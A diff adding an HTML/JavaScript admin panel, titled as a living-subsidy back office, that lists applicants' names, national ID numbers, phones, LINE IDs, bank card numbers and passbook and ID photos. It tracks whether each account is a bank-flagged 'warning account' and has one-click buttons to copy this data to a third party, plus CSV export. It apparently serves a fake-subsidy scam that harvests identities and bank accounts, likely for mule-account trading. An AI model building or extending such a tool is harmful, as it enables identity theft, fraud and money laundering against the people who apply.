@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>生活補助後台 | 申請資料管理</title>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: "Noto Sans TC", "Microsoft JhengHei", Arial, sans-serif;
+      background: #eef3f0;
+      color: #14221a;
+    }
+    header {
+      min-height: 68px;
+      padding: 0 28px;
+      background: #102018;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+    }
+    h1 { margin: 0; font-size: 19px; }
+    .sub { color: #9fb6a8; font-size: 13px; margin-left: 8px; font-weight: 400; }
+    main { max-width: 1360px; margin: 0 auto; padding: 24px 18px 40px; }
+    .panel {
+      background: #fff;
+      border: 1px solid #dbe6de;
+      border-radius: 8px;
+      box-shadow: 0 1px 3px rgba(20, 34, 26, .05);
+      margin-bottom: 16px;
+    }
+    .login { max-width: 420px; margin: 52px auto; padding: 22px; }
+    label { display: block; margin-bottom: 6px; color: #51645a; font-size: 13px; font-weight: 800; }
+    input, select, textarea {
+      width: 100%;
+      border: 1px solid #cedbd2;
+      border-radius: 6px;
+      padding: 9px 10px;
+      font: inherit;
+      color: #17241d;
+      background: #fff;
+    }
+    textarea { min-height: 120px; resize: vertical; }
+    button {
+      border: 1px solid transparent;
+      border-radius: 6px;
+      background: #00a83a;
+      color: #fff;
+      padding: 8px 12px;
+      font: inherit;
+      font-size: 13px;
+      font-weight: 800;
+      cursor: pointer;
+      white-space: nowrap;
+    }
+    button.secondary { background: #fff; color: #51645a; border-color: #d8e2db; }
+    button.danger { background: #fff; color: #b42318; border-color: #f0c7c2; }
+    button:disabled { opacity: .55; cursor: not-allowed; }
+    .hidden { display: none !important; }
+    .notice { color: #718176; font-size: 13px; line-height: 1.6; }
+    .error { color: #b42318; }
+    .stats { display: grid; grid-template-columns: repeat(6, 1fr); gap: 12px; margin-bottom: 18px; }
+    .stat {
+      --accent: #00a83a;
+      background: #fff;
+      border: 1px solid #dbe6de;
+      border-radius: 8px;
+      padding: 16px 14px 14px 18px;
+      min-height: 94px;
+      position: relative;
+      overflow: hidden;
+    }
+    .stat::before { content: ""; position: absolute; left: 0; top: 0; bottom: 0; width: 5px; background: var(--accent); }
+    .stat b { display: block; font-size: 30px; line-height: 1; margin-bottom: 8px; color: #14221a; }
+    .stat span { color: #687b70; font-size: 13px; }
+    .toolbar { padding: 16px; }
+    .toolbar-row { display: flex; align-items: end; gap: 10px; flex-wrap: wrap; }
+    .date-field { width: 160px; }
+    .status-field { width: 160px; }
+    .warning-field { width: 150px; }
+    .spacer { flex: 1; }
+    .search-wrap { display: flex; gap: 8px; min-width: 340px; }
+    .list-head {
+      min-height: 60px;
+      padding: 14px 18px;
+      border-bottom: 1px solid #dbe6de;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+    .lead-list { min-height: 180px; }
+    .lead-row {
+      display: grid;
+      grid-template-columns: 32px minmax(0, 1fr) auto;
+      gap: 12px;
+      align-items: center;
+      padding: 14px 18px;
+      border-bottom: 1px solid #e7eee9;
+    }
+    .lead-row:hover { background: #f8fbf9; }
+    .lead-check { width: auto; }
+    .lead-title { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin-bottom: 7px; }
+    .lead-name { font-size: 16px; font-weight: 900; color: #102018; }
+    .lead-time { color: #8b9b91; font-size: 12px; margin-top: 6px; }
+    .lead-meta { display: flex; gap: 16px; flex-wrap: wrap; color: #52645a; font-size: 13px; }
+    .lead-meta strong { color: #18291f; }
+    .lead-actions { display: flex; justify-content: flex-end; gap: 6px; flex-wrap: wrap; max-width: 520px; }
+    .tag { display: inline-flex; align-items: center; padding: 3px 7px; border-radius: 4px; font-size: 11px; font-weight: 800; }
+    .tag-new { background: #e5f8ea; color: #078532; }
+    .tag-contacted { background: #e8f2ff; color: #2168ae; }
+    .tag-pending { background: #fff4d6; color: #986000; }
+    .tag-approved { background: #eee8ff; color: #6741c7; }
+    .tag-invalid { background: #fde9e9; color: #b42e2e; }
+    .tag-warning { background: #fff0e8; color: #b54708; }
+    .tag-ok { background: #e5f8ea; color: #078532; }
+    .drawer-backdrop { position: fixed; inset: 0; background: rgba(13, 24, 18, .36); z-index: 90; }
+    .drawer {
+      position: fixed;
+      top: 0;
+      right: 0;
+      bottom: 0;
+      width: min(620px, 100%);
+      background: #fff;
+      z-index: 100;
+      display: flex;
+      flex-direction: column;
+      box-shadow: -10px 0 30px rgba(18, 32, 24, .18);
+    }
+    .drawer-head { padding: 18px 20px; border-bottom: 1px solid #dbe6de; display: flex; justify-content: space-between; align-items: center; }
+    .drawer-head h2 { margin: 0; font-size: 19px; }
+    .drawer-body { padding: 18px 20px; overflow: auto; }
+    .detail-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+    .detail-item { border: 1px solid #dbe6de; border-radius: 7px; padding: 10px; min-width: 0; }
+    .detail-item label { color: #849288; font-size: 11px; margin-bottom: 3px; }
+    .detail-item div { overflow-wrap: anywhere; }
+    .detail-section { border-top: 1px solid #e7eee9; margin-top: 18px; padding-top: 18px; }
+    .detail-section h3 { margin: 0 0 10px; font-size: 15px; }
+    .copy-box { min-height: 260px; background: #f7faf8; line-height: 1.75; }
+    .image-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+    .image-card { border: 1px solid #dbe6de; border-radius: 8px; padding: 10px; background: #f8fbf9; }
+    .image-card img { width: 100%; max-height: 220px; object-fit: contain; background: #fff; border-radius: 6px; border: 1px solid #e1e9e3; }
+    .empty { padding: 32px; text-align: center; }
+    @media (max-width: 980px) {
+      .stats { grid-template-columns: repeat(3, 1fr); }
+      .lead-row { grid-template-columns: 28px minmax(0, 1fr); }
+      .lead-actions { grid-column: 2; justify-content: flex-start; max-width: none; }
+    }
+    @media (max-width: 680px) {
+      header { padding: 14px 16px; align-items: flex-start; flex-direction: column; }
+      main { padding: 12px 10px 28px; }
+      .stats { grid-template-columns: repeat(2, 1fr); gap: 8px; }
+      .stat { min-height: 82px; padding: 13px 12px 12px 16px; }
+      .stat b { font-size: 25px; }
+      .date-field, .status-field, .warning-field, .search-wrap { width: 100%; min-width: 0; }
+      .spacer { display: none; }
+      .lead-row { display: block; padding: 14px; }
+      .lead-check { margin-bottom: 8px; }
+      .lead-actions { margin-top: 10px; }
+      .detail-grid, .image-grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>生活補助後台 <span class="sub">申請資料管理</span></h1>
+    <div id="user-bar" class="hidden">
+      <span id="user-email" class="notice"></span>
+      <button class="secondary" onclick="signOut()">登出</button>
+    </div>
+  </header>
+
+  <main>
+    <section id="login-panel" class="panel login">
+      <h2>管理員登入</h2>
+      <p class="notice">請輸入管理員帳號與密碼。</p>
+      <label for="admin-email">帳號</label>
+      <input id="admin-email" type="text" placeholder="admin" autocomplete="username" />
+      <div style="height:12px"></div>
+      <label for="admin-password">密碼</label>
+      <input id="admin-password" type="password" autocomplete="current-password" />
+      <div style="height:14px"></div>
+      <button id="login-btn" onclick="login()">登入</button>
+      <p id="login-msg" class="notice"></p>
+    </section>
+
+    <section id="app-panel" class="hidden">
+      <div class="stats">
+        <div class="stat" style="--accent:#00a83a"><b id="stat-total">0</b><span>目前篩選</span></div>
+        <div class="stat" style="--accent:#3185ff"><b id="stat-today">0</b><span>今日新增</span></div>
+        <div class="stat" style="--accent:#dd8700"><b id="stat-new">0</b><span>新申請</span></div>
+        <div class="stat" style="--accent:#8a55ed"><b id="stat-contacted">0</b><span>已聯絡</span></div>
+        <div class="stat" style="--accent:#b54708"><b id="stat-warning">0</b><span>警示戶</span></div>
+        <div class="stat" style="--accent:#6741c7"><b id="stat-approved">0</b><span>已通過</span></div>
+      </div>
+
+      <div class="panel toolbar">
+        <div class="toolbar-row">
+          <div class="date-field"><label>開始日期</label><input id="date-from" type="date" onchange="render()" /></div>
+          <div class="date-field"><label>結束日期</label><input id="date-to" type="date" onchange="render()" /></div>
+          <div class="status-field">
+            <label>狀態</label>
+            <select id="status-filter" onchange="render()">
+              <option value="">全部</option>
+              <option value="new">新申請</option>
+              <option value="contacted">已聯絡</option>
+              <option value="pending_docs">需補件</option>
+              <option value="approved">已通過</option>
+              <option value="invalid">無效</option>
+            </select>
+          </div>
+          <div class="warning-field">
+            <label>警示戶</label>
+            <select id="warning-filter" onchange="render()">
+              <option value="">全部</option>
+              <option value="yes">是</option>
+              <option value="no">否</option>
+              <option value="resolved">曾經是</option>
+            </select>
+          </div>
+          <button onclick="loadLeads()">刷新</button>
+          <div class="spacer"></div>
+          <div class="search-wrap">
+            <input id="search" placeholder="搜尋姓名 / 手機 / LINE / 證件號 / 銀行卡號" oninput="render()" />
+            <button onclick="render()">搜尋</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="panel">
+        <div class="list-head">
+          <h2>申請列表</h2>
+          <div>
+            <button class="secondary" onclick="exportCSV()">匯出 CSV</button>
+          </div>
+        </div>
+        <div id="lead-list" class="lead-list"></div>
+        <p id="empty-msg" class="notice empty hidden">目前沒有符合條件的資料。</p>
+      </div>
+    </section>
+  </main>
+
+  <div id="drawer-backdrop" class="drawer-backdrop hidden" onclick="closeDetails()"></div>
+  <aside id="drawer" class="drawer hidden">
+    <div class="drawer-head">
+      <h2 id="drawer-title">資料詳情</h2>
+      <button class="secondary" onclick="closeDetails()">關閉</button>
+    </div>
+    <div id="drawer-body" class="drawer-body"></div>
+  </aside>
+
+  <script>
+    const SUPABASE_URL = 'https://xgjnmhedqwehxgwnlggo.supabase.co';
+    const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_p_Y0qsHy4W4cv5f--pprEg_5Bdq1-kt';
+    const STORAGE_BUCKET = 'subsidy-documents';
+    const LEADS_TABLE = 'subsidy_leads';
+    const ADMIN_LOGIN_NAME = 'admin';
+    const ADMIN_AUTH_EMAIL = 'admin@taiwan-subsidy.com';
+    const client = window.supabase ? supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY) : null;
+
+    const statusLabels = {
+      new: '新申請',
+      contacted: '已聯絡',
+      pending_docs: '需補件',
+      approved: '已通過',
+      invalid: '無效'
+    };
+
+    let leads = [];
+    let activeLeadId = null;
+
+    function escapeHTML(value) {
+      return String(value || '').replace(/[&<>"']/g, ch => ({
+        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;'
+      }[ch]));
+    }
+
+    function formatDate(value) {
+      return value ? new Date(value).toLocaleString('zh-TW', { hour12: false }) : '';
+    }
+
+    function warningLabel(value) {
+      return ({ yes: '是', no: '否', resolved: '曾經是' })[value] || value || '';
+    }
+
+    function statusTag(status) {
+      const cls = status === 'approved' ? 'tag-approved' :
+        status === 'pending_docs' ? 'tag-pending' :
+        status === 'invalid' ? 'tag-invalid' :
+        status === 'contacted' ? 'tag-contacted' : 'tag-new';
+      return `<span class="tag ${cls}">${escapeHTML(statusLabels[status] || status || '新申請')}</span>`;
+    }
+
+    function warningTag(value) {
+      if (value === 'yes') return '<span class="tag tag-warning">警示戶</span>';
+      if (value === 'resolved') return '<span class="tag tag-pending">曾為警示戶</span>';
+      return '<span class="tag tag-ok">非警示戶</span>';
+    }
+
+    async function login() {
+      if (!client) {
+        document.getElementById('login-msg').textContent = '請先填入 Supabase 設定。';
+        return;
+      }
+      const account = document.getElementById('admin-email').value.trim();
+      const email = account === ADMIN_LOGIN_NAME ? ADMIN_AUTH_EMAIL : account;
+      const password = document.getElementById('admin-password').value;
+      const button = document.getElementById('login-btn');
+      button.disabled = true;
+      const { data, error } = await client.auth.signInWithPassword({ email, password });
+      button.disabled = false;
+      if (error) {
+        document.getElementById('login-msg').textContent = '登入失敗：' + error.message;
+        return;
+      }
+      showApp(data.user);
+      loadLeads();
+    }
+
+    async function signOut() {
+      if (client) await client.auth.signOut();
+      document.getElementById('login-panel').classList.remove('hidden');
+      document.getElementById('app-panel').classList.add('hidden');
+      document.getElementById('user-bar').classList.add('hidden');
+    }
+
+    async function checkSession() {
+      if (!client) {
+        document.getElementById('login-msg').textContent = '請先填入 Supabase URL 與 publishable key。';
+        return;
+      }
+      const { data } = await client.auth.getSession();
+      if (data.session) {
+        showApp(data.session.user);
+        loadLeads();
+      }
+    }
+
+    function showApp(user) {
+      document.getElementById('login-panel').classList.add('hidden');
+      document.getElementById('app-panel').classList.remove('hidden');
+      document.getElementById('user-bar').classList.remove('hidden');
+      document.getElementById('user-email').textContent = user.email || '';
+    }
+
+    async function loadLeads() {
+      const { data, error } = await client
+        .from(LEADS_TABLE)
+        .select('*')
+        .order('created_at', { ascending: false });
+      if (error) {
+        alert('讀取資料失敗：' + error.message);
+        return;
+      }
+      leads = data || [];
+      render();
+    }
+
+    function filteredLeads() {
+      const q = document.getElementById('search').value.trim().toLowerCase();
+      const status = document.getElementById('status-filter').value;
+      const warning = document.getElementById('warning-filter').value;
+      const from = document.getElementById('date-from').value;
+      const to = document.getElementById('date-to').value;
+      return leads.filter(lead => {
+        if (status && lead.status !== status) return false;
+        if (warning && lead.warning_account !== warning) return false;
+        if (from && new Date(lead.created_at) < new Date(from + 'T00:00:00')) return false;
+        if (to && new Date(lead.created_at) > new Date(to + 'T23:59:59')) return false;
+        if (!q) return true;
+        return [
+          lead.name,
+          lead.id_number,
+          lead.phone,
+          lead.line_id,
+          lead.bank_account,
+          lead.subsidy_amount,
+          lead.monthly_income
+        ].some(value => String(value || '').toLowerCase().includes(q));
+      });
+    }
+
+    function renderStats(data) {
+      const today = new Date();
+      document.getElementById('stat-total').textContent = data.length;
+      document.getElementById('stat-today').textContent = data.filter(x => {
+        const d = new Date(x.created_at);
+        return d.getFullYear() === today.getFullYear() && d.getMonth() === today.getMonth() && d.getDate() === today.getDate();
+      }).length;
+      document.getElementById('stat-new').textContent = data.filter(x => (x.status || 'new') === 'new').length;
+      document.getElementById('stat-contacted').textContent = data.filter(x => x.status === 'contacted').length;
+      document.getElementById('stat-warning').textContent = data.filter(x => x.warning_account === 'yes').length;
+      document.getElementById('stat-approved').textContent = data.filter(x => x.status === 'approved').length;
+    }
+
+    function render() {
+      const data = filteredLeads();
+      const list = document.getElementById('lead-list');
+      document.getElementById('empty-msg').classList.toggle('hidden', data.length > 0);
+      renderStats(data);
+      list.innerHTML = data.map((lead, index) => `
+        <article class="lead-row">
+          <input class="lead-check" type="checkbox" />
+          <div>
+            <div class="lead-title">
+              <span class="lead-name">${escapeHTML(lead.name || '未填姓名')}</span>
+              ${statusTag(lead.status || 'new')}
+              ${warningTag(lead.warning_account)}
+            </div>
+            <div class="lead-meta">
+              <span>手機 <strong>${escapeHTML(lead.phone)}</strong></span>
+              <span>補助 <strong>${escapeHTML(lead.subsidy_amount || lead.amount)}</strong></span>
+              <span>收入 <strong>${escapeHTML(lead.monthly_income || lead.employment)}</strong></span>
+              <span>卡號 <strong>${escapeHTML(lead.bank_account || '未填')}</strong></span>
+            </div>
+            <div class="lead-time">${escapeHTML(formatDate(lead.created_at))}</div>
+          </div>
+          <div class="lead-actions">
+            <button onclick="copyClient('${lead.id}')">一鍵複製給甲方</button>
+            <button class="secondary" onclick="copyField('${lead.id}','bank_account')">複製卡號</button>
+            <button class="secondary" onclick="openDetails('${lead.id}')">詳情</button>
+          </div>
+        </article>
+      `).join('');
+    }
+
+    async function signedUrl(path) {
+      if (!path) return '';
+      if (/^https?:\/\//.test(path)) return path;
+      const { data, error } = await client.storage.from(STORAGE_BUCKET).createSignedUrl(path, 60 * 10);
+      return error ? '' : data.signedUrl;
+    }
+
+    async function openDetails(id) {
+      const lead = leads.find(item => item.id === id);
+      if (!lead) return;
+      activeLeadId = id;
+      const idUrl = await signedUrl(lead.id_document_path || lead.id_front_path);
+      const bankUrl = await signedUrl(lead.bank_book_path);
+      document.getElementById('drawer-title').textContent = (lead.name || '申請人') + ' 詳情';
+      document.getElementById('drawer-body').innerHTML = `
+        <div class="detail-grid">
+          ${detailItem('姓名', lead.name)}
+          ${detailItem('證件號', lead.id_number)}
+          ${detailItem('手機號', lead.phone)}
+          ${detailItem('LINE ID', lead.line_id)}
+          ${detailItem('銀行卡號 / 收款帳戶', lead.bank_account)}
+          ${detailItem('申請補助金額', lead.subsidy_amount || lead.amount)}
+          ${detailItem('工作收入', lead.monthly_income || lead.employment)}
+          ${detailItem('是否警示戶', warningLabel(lead.warning_account))}
+          ${detailItem('狀態', statusLabels[lead.status || 'new'])}
+          ${detailItem('提交時間', formatDate(lead.created_at))}
+        </div>
+        <div class="detail-section">
+          <h3>一鍵給甲方資料</h3>
+          <textarea id="copy-text" class="copy-box" readonly>${escapeHTML(clientText(lead))}</textarea>
+          <div style="height:10px"></div>
+          <button onclick="copyClient('${lead.id}')">複製給甲方</button>
+          <button class="secondary" onclick="copyField('${lead.id}','bank_account')">只複製銀行卡號</button>
+        </div>
+        <div class="detail-section">
+          <h3>上傳圖片</h3>
+          <div class="image-grid">
+            ${imageCard('證件', idUrl, lead.id_document_path || lead.id_front_path)}
+            ${imageCard('銀行本子', bankUrl, lead.bank_book_path)}
+          </div>
+          <p class="notice">圖片建議存 Supabase Storage 私密 bucket，資料表只存路徑。前台上傳前壓縮至約 300-500KB。</p>
+        </div>
+        <div class="detail-section">
+          <h3>狀態與備註</h3>
+          <select id="detail-status">
+            ${Object.entries(statusLabels).map(([value, label]) => `<option value="${value}" ${value === (lead.status || 'new') ? 'selected' : ''}>${label}</option>`).join('')}
+          </select>
+          <div style="height:10px"></div>
+          <textarea id="detail-notes" placeholder="客服備註">${escapeHTML(lead.notes || '')}</textarea>
+          <div style="height:10px"></div>
+          <button onclick="saveDetail('${lead.id}')">保存</button>
+        </div>
+      `;
+      document.getElementById('drawer-backdrop').classList.remove('hidden');
+      document.getElementById('drawer').classList.remove('hidden');
+    }
+
+    function detailItem(label, value) {
+      return `<div class="detail-item"><label>${escapeHTML(label)}</label><div>${escapeHTML(value || '未填')}</div></div>`;
+    }
+
+    function imageCard(label, url, path) {
+      if (!path) {
+        return `<div class="image-card"><label>${escapeHTML(label)}</label><p class="notice">未上傳</p></div>`;
+      }
+      return `<div class="image-card"><label>${escapeHTML(label)}</label>${url ? `<a href="${escapeHTML(url)}" target="_blank"><img src="${escapeHTML(url)}" alt="${escapeHTML(label)}"></a>` : '<p class="notice">暫時無法產生預覽連結</p>'}<p class="notice">${escapeHTML(path)}</p></div>`;
+    }
+
+    function closeDetails() {
+      activeLeadId = null;
+      document.getElementById('drawer-backdrop').classList.add('hidden');
+      document.getElementById('drawer').classList.add('hidden');
+    }
+
+    function clientText(lead) {
+      return [
+        `姓名：${lead.name || ''}`,
+        `證件號：${lead.id_number || ''}`,
+        `手機號：${lead.phone || ''}`,
+        `LINE ID：${lead.line_id || ''}`,
+        `銀行卡號 / 收款帳戶：${lead.bank_account || ''}`,
+        `申請補助金額：${lead.subsidy_amount || lead.amount || ''}`,
+        `工作收入：${lead.monthly_income || lead.employment || ''}`,
+        `是否警示戶：${warningLabel(lead.warning_account)}`,
+        `證件圖片：${lead.id_document_path || lead.id_front_path || ''}`,
+        `銀行本子圖片：${lead.bank_book_path || ''}`
+      ].join('\n');
+    }
+
+    async function copyClient(id) {
+      const lead = leads.find(item => item.id === id);
+      if (!lead) return;
+      await copyText(clientText(lead));
+      alert('已複製給甲方的資料');
+    }
+
+    async function copyField(id, field) {
+      const lead = leads.find(item => item.id === id);
+      if (!lead) return;
+      await copyText(lead[field] || '');
+      alert('已複製');
+    }
+
+    async function copyText(text) {
+      try {
+        await navigator.clipboard.writeText(text || '');
+      } catch (error) {
+        const area = document.createElement('textarea');
+        area.value = text || '';
+        area.style.position = 'fixed';
+        area.style.opacity = '0';
+        document.body.appendChild(area);
+        area.select();
+        document.execCommand('copy');
+        area.remove();
+      }
+    }
+
+    async function saveDetail(id) {
+      const status = document.getElementById('detail-status').value;
+      const notes = document.getElementById('detail-notes').value;
+      const { error } = await client.from(LEADS_TABLE).update({
+        status,
+        notes,
+        updated_at: new Date().toISOString()
+      }).eq('id', id);
+      if (error) {
+        alert('保存失敗：' + error.message);
+        return;
+      }
+      await loadLeads();
+      if (activeLeadId) openDetails(activeLeadId);
+    }
+
+    function exportCSV() {
+      const cols = ['created_at','name','id_number','phone','line_id','bank_account','subsidy_amount','monthly_income','warning_account','status','id_document_path','bank_book_path','notes'];
+      const rows = filteredLeads();
+      const csv = [cols.join(',')].concat(rows.map(row =>
+        cols.map(col => '"' + String(row[col] || '').replace(/"/g, '""') + '"').join(',')
+      )).join('\n');
+      const blob = new Blob(['\ufeff' + csv], { type: 'text/csv;charset=utf-8' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'subsidy-leads-' + new Date().toISOString().slice(0, 10) + '.csv';
+      a.click();
+      URL.revokeObjectURL(url);
+    }
+
+    checkSession();
+  </script>
+</body>
+</html>
